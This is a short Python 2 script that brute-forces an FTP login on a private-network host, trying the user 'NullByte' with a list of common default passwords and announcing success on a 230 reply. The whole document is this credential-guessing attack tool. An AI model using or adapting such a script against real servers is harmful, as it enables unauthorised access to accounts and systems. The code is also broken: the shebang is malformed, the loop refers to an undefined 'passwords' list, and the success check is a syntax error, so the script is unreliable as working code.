#! usr/bin/python
import socket
import re
import sys

def connect(uname, pword):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "[*] Trying " + uname + " : " + pword
    s.connect(('192.168.1.105', 21))
    data = s.recv(1024)
    s.send('USER '+ uname + '\r\n')
    data = s.recv(1024)
    s.send('PASS '+ pword + '\r\n')
    data = s.recv(3)
    s.send('QUIT\r\n')
    s.close()
    return data
username = "NullByte"
password = ["test", "backup", "password", "12345", "root", "administrator", "ftp", "admin"]
for password in passwords:
    attempt = connect(username, password)
    if attempt = '230':
        print "[*] All your base are belong to us! Password: "+password
        sys.exit(0)
